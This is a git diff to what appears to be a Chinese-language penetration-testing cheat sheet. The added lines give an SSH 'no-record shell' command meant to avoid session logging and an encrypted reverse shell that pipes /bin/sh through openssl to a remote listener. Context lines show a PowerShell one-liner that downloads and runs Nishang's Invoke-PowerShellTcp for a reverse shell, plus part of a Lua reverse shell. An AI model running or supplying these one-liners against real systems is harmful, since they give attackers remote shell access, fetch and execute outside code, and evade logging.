@@ -69,6 +69,12 @@ proxychain
 sockscap64    
 proxifier   
 
+## ssh
+无记录shell
+
+```
+ ssh -T root@192.168.1.1 /usr/bin/bash -i
+```
 
 ## grep
 
@@ -657,6 +663,12 @@ lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','123
 
 ```
 powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 172.16.1.130 -port 4444
+```
+
+## 加密shell
+```
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.0.100:2333 > /tmp/s; rm /tmp/s
+
 ```
 
 # msf大全
